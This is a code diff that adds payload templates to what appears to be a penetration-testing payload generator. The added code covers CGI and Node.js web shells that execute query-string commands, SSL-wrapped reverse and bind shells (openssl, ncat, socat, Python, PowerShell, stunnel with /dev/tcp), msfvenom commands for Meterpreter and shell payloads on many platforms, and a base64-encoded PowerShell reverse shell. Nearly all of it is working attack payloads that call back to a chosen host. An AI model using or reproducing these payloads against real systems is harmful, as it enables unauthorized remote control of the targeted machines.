+            # CGI Shells
+            "CGI Bash": """#!/bin/bash
+echo "Content-type: text/html"
+echo ""
+echo "<html><body><pre>"
+$QUERY_STRING
+echo "</pre></body></html>"
+
+# Usage: /cgi-bin/shell.cgi?whoami""",
+            "CGI Perl": """#!/usr/bin/perl
+use CGI qw(:standard);
+print header;
+print "<pre>";
+print `$ENV{'QUERY_STRING'}`;
+print "</pre>";
+
+# Usage: /cgi-bin/shell.cgi?whoami""",
+            "CGI Python": """#!/usr/bin/env python3
+import cgi
+import subprocess
+import html
+
+print("Content-type: text/html\\n")
+params = cgi.FieldStorage()
+cmd = params.getvalue('cmd', '')
+if cmd:
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(f"<pre>{html.escape(result.stdout + result.stderr)}</pre>")
+
+# Usage: /cgi-bin/shell.py?cmd=whoami""",
+
+            # Node.js Web Shell
+            "Node.js Express": """// Save as shell.js and run: node shell.js
+const express = require('express');
+const { execSync } = require('child_process');
+const app = express();
+
+app.get('/cmd', (req, res) => {
+    const cmd = req.query.cmd;
+    if(cmd){
+        try {
+            const output = execSync(cmd).toString();
+            res.send(`<pre>${output}</pre>`);
+        } catch(e) {
+            res.send(`<pre>Error: ${e.message}</pre>`);
+        }
+    } else {
+        res.send('Usage: /cmd?cmd=whoami');
+    }
+});
+
+app.listen(8080, () => console.log('Shell running on port 8080'));
+// Usage: http://target:8080/cmd?cmd=whoami"""
+        }
+        return shells.get(shell_type, "# Shell type not found")
+
+    def get_encrypted_shell(self, ip, port, shell_type):
+        """Get encrypted/SSL shell payload based on type."""
+        shells = {
+            "OpenSSL Reverse": f"""# Attacker (listener):
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port {port}
+
+# Target (connect back):
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s""",
+
+            "OpenSSL Bind": f"""# Target (listener):
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_server -quiet -key key.pem -cert cert.pem -port {port} > /tmp/s
+
+# Attacker (connect):
+openssl s_client -quiet -connect <TARGET_IP>:{port}""",
+
+            "Ncat SSL Reverse": f"""# Attacker (listener):
+ncat --ssl -lvnp {port}
+
+# Target (connect back):
+ncat --ssl {ip} {port} -e /bin/bash""",
+
+            "Ncat SSL Bind": f"""# Target (listener):
+ncat --ssl -lvnp {port} -e /bin/bash
+
+# Attacker (connect):
+ncat --ssl <TARGET_IP> {port}""",
+
+            "Socat SSL Reverse": f"""# Attacker (listener) - generate cert first:
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
+cat shell.key shell.crt > shell.pem
+socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0,fork STDOUT
+
+# Target (connect back):
+socat OPENSSL:{ip}:{port},verify=0 EXEC:/bin/bash""",
+
+            "Socat SSL Bind": f"""# Target (listener) - generate cert first:
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
+cat shell.key shell.crt > shell.pem
+socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0,fork EXEC:/bin/bash
+
+# Attacker (connect):
+socat OPENSSL:<TARGET_IP>:{port},verify=0 STDOUT""",
+
+            "Python SSL Reverse": f"""# Attacker (listener):
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+python3 -c "
+import socket,ssl
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain('cert.pem', 'key.pem')
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+    sock.bind(('0.0.0.0', {port}))
+    sock.listen(1)
+    with context.wrap_socket(sock, server_side=True) as ssock:
+        conn, addr = ssock.accept()
+        while True:
+            cmd = input('$ ')
+            conn.send((cmd + '\\n').encode())
+            print(conn.recv(4096).decode(), end='')
+"
+
+# Target (connect back):
+python3 -c "
+import socket,ssl,subprocess,os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+context.check_hostname = False
+context.verify_mode = ssl.CERT_NONE
+ss = context.wrap_socket(s, server_hostname='{ip}')
+ss.connect(('{ip}', {port}))
+os.dup2(ss.fileno(),0)
+os.dup2(ss.fileno(),1)
+os.dup2(ss.fileno(),2)
+subprocess.call(['/bin/sh','-i'])
+" """,
+
+            "PowerShell SSL Reverse": f"""# Attacker: Set up SSL listener (use ncat --ssl -lvnp {port})
+
+# Target (connect back):
+$client = New-Object Net.Sockets.TcpClient("{ip}",{port})
+$ssl = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]))
+$ssl.AuthenticateAsClient("")
+$writer = New-Object IO.StreamWriter($ssl)
+$writer.AutoFlush = $true
+$reader = New-Object IO.StreamReader($ssl)
+while(($cmd = $reader.ReadLine()) -ne "exit"){{
+    $output = (Invoke-Expression $cmd 2>&1 | Out-String)
+    $writer.WriteLine($output)
+}}
+$client.Close()""",
+
+            "Bash /dev/tcp SSL": f"""# Note: Bash /dev/tcp doesn't support SSL natively
+# Use stunnel as a wrapper:
+
+# Attacker - create stunnel.conf:
+cat > stunnel.conf << EOF
+[shell]
+accept = {port}
+connect = 127.0.0.1:4445
+cert = cert.pem
+key = key.pem
+EOF
+
+# Start stunnel and nc:
+stunnel stunnel.conf
+nc -lvnp 4445
+
+# Target - if stunnel available:
+stunnel -c -d 127.0.0.1:4446 -r {ip}:{port}
+bash -i >& /dev/tcp/127.0.0.1/4446 0>&1"""
+        }
+        return shells.get(shell_type, "# Shell type not found")
+
+    def get_msfvenom_payload(self, ip, port, shell_type):
+        """Get MSFVenom command based on type."""
+        payloads = {
+            # Linux Payloads
+            "Linux x86 Reverse": f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
+            "Linux x64 Reverse": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
+            "Linux x86 Bind": f"msfvenom -p linux/x86/shell_bind_tcp LPORT={port} -f elf > bind_shell.elf",
+            "Linux x64 Bind": f"msfvenom -p linux/x64/shell_bind_tcp LPORT={port} -f elf > bind_shell.elf",
+            "Linux x86 Meterpreter": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > meterpreter.elf",
+            "Linux x64 Meterpreter": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > meterpreter.elf",
+
+            # Windows Payloads
+            "Windows x86 Reverse": f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
+            "Windows x64 Reverse": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
+            "Windows x86 Bind": f"msfvenom -p windows/shell_bind_tcp LPORT={port} -f exe > bind_shell.exe",
+            "Windows x64 Bind": f"msfvenom -p windows/x64/shell_bind_tcp LPORT={port} -f exe > bind_shell.exe",
+            "Windows x86 Meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > meterpreter.exe",
+            "Windows x64 Meterpreter": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > meterpreter.exe",
+            "Windows x64 Meterpreter HTTPS": f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} -f exe > meterpreter_https.exe",
+
+            # Web Payloads
+            "PHP Meterpreter": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php",
+            "Python Meterpreter": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.py",
+            "Java Meterpreter": f"msfvenom -p java/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jar > shell.jar",
+            "ASP Meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp",
+            "ASPX Meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx > shell.aspx",
+            "JSP Meterpreter": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
+            "WAR Meterpreter": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
+
+            # Other Platforms
+            "macOS x64 Reverse": f"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho > shell.macho",
+            "macOS x64 Bind": f"msfvenom -p osx/x64/shell_bind_tcp LPORT={port} -f macho > bind_shell.macho",
+            "Android Meterpreter": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > shell.apk",
+            "NodeJS Reverse": f"msfvenom -p nodejs/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.js"
+        }
+
+        # Add handler command as a comment
+        payload_cmd = payloads.get(shell_type, "# Payload type not found")
+
+        # Add listener setup info
+        handler_info = f"""
+# Start Metasploit handler:
+# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD <payload_name>; set LHOST {ip}; set LPORT {port}; run"
+"""
+        return payload_cmd + handler_info
+
     def generate_ps_base64(self, ip, port):
         """Generate Base64 encoded PowerShell reverse shell."""
-        import base64
         ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
         encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
         return f"powershell -e {encoded}"
@@ -7059,26 +7659,10 @@ Configure in the Settings tab:
         
         return None  # Valid
 
-    def validate_extra_options(self, options):
-        """
-        Enhanced validation for extra options across all tools.
-        Prevents command injection via extra options.
-        """
-        if not options:
-            return True
-        
-        # Security: Reject shell metacharacters
-        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '$(', '${', '&&', '||']
-        for char in dangerous_chars:
-            if char in options:
-                return False
-        
-        # Max length check
-        if len(options) > 500:
-            return False
-        
-        return True
-    
+    # NOTE: validate_extra_options is defined later in this file (around line 8817)
+    # with more comprehensive security checks including shlex parsing and regex patterns.
+    # The duplicate simpler version has been removed to avoid confusion.
+
     def validate_metasploit_options(self, options):
         """
         FIX CRIT-3: Validate Metasploit KEY=VALUE options.
